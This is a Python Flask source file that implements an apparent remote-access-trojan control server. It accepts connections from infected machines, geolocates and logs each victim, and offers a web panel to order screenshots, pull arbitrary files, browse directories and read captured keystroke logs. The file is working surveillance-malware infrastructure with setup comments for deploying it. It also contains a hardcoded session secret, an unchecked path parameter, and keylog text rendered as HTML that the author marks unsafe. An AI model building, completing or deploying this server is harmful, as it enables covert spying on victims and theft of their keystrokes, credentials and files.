#                                                   myFlask.py
import functools
print = functools.partial(print, flush=True)
from flask import Flask, flash, redirect, render_template, request, session, send_file, send_from_directory
from werkzeug.security import check_password_hash
import socket
import threading
from geoip import geolite2
from helpers import *
import os
import textile
from urllib.parse import quote,unquote
from math import ceil
import bcrypt
from gevent.pywsgi import WSGIServer
from datetime import timedelta,datetime

# list of connections
con_list = {}
con_info = {}

# change host and port to ones you want to listen on
HOST = ''
PORT = 0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()

# path to folder shared on FTP
# user files saved here
# provide path to your ftp folder
FILES_PATH = ""



# A function that would run as a thread and await new connections
# upon receiving new connection adds it to a list of socket connections
def thread_manage_connections(sock, con_list):
	while True:
		conn, addr = sock.accept()
		key = str(addr[0])+':'+str(addr[1])
		con_list[key] = conn,addr
		info = send_recv(con_list,key,"sys_info")
		loc = geolite2.lookup(str(addr[0]))
		info['location'] = loc.country if loc is not None else 'Unknown Location'
		con_info[key] = info
		# make needed dirs in ftp folder
		if not con_info[key]['user'] in os.listdir(FILES_PATH):
			os.mkdir(FILES_PATH + os.sep + con_info[key]['user'])
			os.mkdir(FILES_PATH + os.sep + con_info[key]['user'] + os.sep + 'files')
			os.mkdir(FILES_PATH + os.sep + con_info[key]['user'] + os.sep + 'screens')
			os.mkdir(FILES_PATH + os.sep + con_info[key]['user'] + os.sep + 'keylogs')
		print("Got new connection from:{}".format( str(addr) ))
		cursor = db.cursor()
		cursor.execute("SELECT * FROM clients WHERE user_name=? AND location=?;",(info['user'],info['location']))
		doc = cursor.fetchall()
		#print(doc)
		if len(doc) == 0:
			cursor.execute("INSERT INTO clients(user_name,os,location,date_added,last_seen) VALUES(?,?,?,?,?);", (info['user'],info['os'],info['location'],datetime.now(),datetime.now()) )
			db.commit()
			print('New Client. DB Updated!')
		else:
			cursor.execute("UPDATE clients SET last_seen=? WHERE user_name=? AND location=?;",(datetime.now(),info['user'],info['location']))
			db.commit()
			print("Existing client. DB Updated!")
		cursor.close()


# connect sqlite
db = sqlite_connection()
if not db_user_check(db):
	print('An error occured while configuring DB!')
	input('Press any key to exit...')
	sys.exit(0)


# run conn manager thread 
mngr = threading.Thread(target=thread_manage_connections, args=(s, con_list))
mngr.start()



app = Flask(__name__)


# key for cookies
app.secret_key = 'k9mgC4NP9+dtLd2hPIyLzQ=='
# session lifetime
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=60)


@app.route('/')
@login_required
def index():
	return render_template("landing.html",con_num=len(con_list))


@app.route('/login',methods=['POST','GET'])
def login():
	if request.method == 'POST':
		uname = request.json['username']
		password = request.json['pass']
		cursor = db.cursor()
		cursor.execute("SELECT * FROM admins WHERE user_name=?",(uname,))
		cur_user = cursor.fetchone()
		if cur_user:
			if check_password_hash(cur_user[2],password):
				session['username'] = uname
				ans = {'status':'ok'}
				session.permanent = True
				cursor.close()
				return json.dumps(ans)
		ans = {'status': 'nok'}
		cursor.close()
		return json.dumps(ans)

	return render_template('login.html')

@app.route('/logout',methods=['POST'])
@login_required
def logout():
	session.clear()
	return redirect("/")

@app.route('/clients')
@login_required
def connections_list():
	return render_template("clientss.html",con_list=con_list,con_info=con_info,len=len(con_list),keys=list(con_list.keys()))


@app.route('/offline_clients')
@login_required
def offline_clients():
	cursor = db.cursor()
	cursor.execute('SELECT * FROM clients;')
	clients = cursor.fetchall()
	offline = []
	cursor.close()
	if clients:
		for offline_client in clients:
			if(len(con_info)):
				for i in con_info.keys():
					if offline_client[1] == con_info[i]['user']:
						continue
					offline.append(offline_client)
			else:
				offline.append(offline_client)
		offline = sql_to_json_list(offline)
		return render_template("offline_clients.html",offline=offline,len=len(offline))


@app.route('/clientMenu', methods=["POST"])
@login_required
def client_menu():

	client = request.form.get("client")
	user_name = con_info[client]["user"]
	location = con_info[client]["location"]

	try:
		answer = send_recv(con_list,client,"hdd_info")
	except Exception as e:
		# on exception(disconnect etc..) pop the client from the list
		# add page with error and redirection...
		print(e)
		con_list.pop(client)
		con_info.pop(client)
		return render_template("landing.html",con_num=len(con_list))

	cursor = db.cursor()
	cursor.execute('SELECT * FROM clients WHERE user_name = ? AND location = ?;',(user_name,location))
	doc = cursor.fetchall()
	doc = sql_to_json_one(doc)
	cursor.close()
	return render_template("client_menu3.html",json_list = answer,client=client,con_list=con_list,con_info=con_info,user_name=user_name,client_db=doc)


@app.route('/offline_client_menu',methods=['POST'])
@login_required
def offline_client_menu():
	client = {}
	user_name = request.form.get('user_name')
	location = request.form.get('location')
	cursor = db.cursor()
	cursor.execute('SELECT * FROM clients WHERE user_name = ? AND location = ?;',(user_name,location))
	doc = cursor.fetchone()
	# conver fetched data to dictionary format
	# due to original nosql db usage
	doc = sql_to_json_one([doc])
	cursor.close()
	print(doc)
	if doc:
		client['user_name'] = user_name
		client['location'] = location
		client['date_added'] = datetime.strptime(doc['date_added'],'%Y-%m-%d %H:%M:%S.%f').strftime("%d/%m/%Y - %H:%M:%S")
		client['last_seen'] = datetime.strptime(doc['last_seen'],'%Y-%m-%d %H:%M:%S.%f').strftime("%d/%m/%Y - %H:%M:%S")
		client['os'] = doc['os']
		return render_template("offline_client_menu.html",client=client)


@app.route('/dirList', methods=["POST"])
@login_required
def dirList():
	client = request.json['client']
	path = request.json['path']
	if not path.endswith('\\'):
		path += '\\'
	answer = send_recv(con_list,client,'path:'+path)
	if 'status' in answer:
		return
	return render_template("dir2.html",dirList = answer,curDir=path,client=client)


@app.route('/actions',methods=["POST"])
@login_required
def actions():
	if 'username' not in session:
		return render_template("login.html")
	client = request.json['client']
	cmd = request.json['cmd']

	if cmd == 'screen_shot':
		answer = send_recv(con_list,client,cmd)
		return answer['status']
	elif cmd == 'get_file':
		answer = send_recv(con_list,client,'file:' + request.json['path'])
		return answer['status']
	elif cmd == "local_files":
		cur_path = FILES_PATH + os.sep + client + os.sep + 'files'
		list = os.listdir(cur_path)
		return render_template("files-for-clientMenu.html",user_files=list,path=cur_path,client=client)
	elif cmd == "local_keylogs":
		cur_path = FILES_PATH + os.sep + client + os.sep + 'keylogs'
		logs = {}
		for day in os.listdir(cur_path):
			day_path = cur_path + os.sep + day
			day_log = ''
			for log in os.listdir(day_path):
				log_path = day_path + os.sep + log
				with open(log_path,'r',encoding="utf-8") as cur:
					day_log += cur.read()
			# convert text to html format for proper presentation on the page
			# not safe
			logs[day] = textile.textile(day_log)

		return render_template("keylogs-for-clientMenu.html",user_logs=logs,client=client)
	elif cmd == "local_screenshots":
		cur_path = FILES_PATH + os.sep + client + os.sep + 'screens'
		user_list = os.listdir(cur_path)
		return render_template("screens-for-clientMenu.html",user_files=user_list,path=quote(cur_path,safe=''), client=client)


@app.route('/download',methods=["POST"])
@login_required
def download():
	client = request.json['client']
	file_type = request.json['type']
	file_name = request.json['name']

	return send_file(FILES_PATH + os.sep + client + os.sep + file_type + os.sep + file_name,as_attachment=True)


@app.route('/screens/<path:filename>')
@login_required
def screens(filename):
	print("Sending: " + filename)
	return send_from_directory(FILES_PATH , filename, as_attachment=True)


@app.route('/screens_by_day',methods=["POST"])
@login_required
def screens_by_day():
	# get json data
	path = unquote(request.json['path'])
	client = request.json['client']
	folder = request.json['folder']
	# contents of requested day screenshot's folder
	contents = os.listdir(path)
	# change this value if u want more screens on the web page
	# needed to paginate the data
	per_page = 20
	pages = ceil(len(contents) / per_page)
	return render_template("screens-for-clientMenu-ajax-list.html",screens_list=contents,per_page=per_page,pages=pages,client=client,folder=folder)

# serve the app
# choose host and port
https_server = WSGIServer(('0.0.0.0',443), app)
https_server.serve_forever()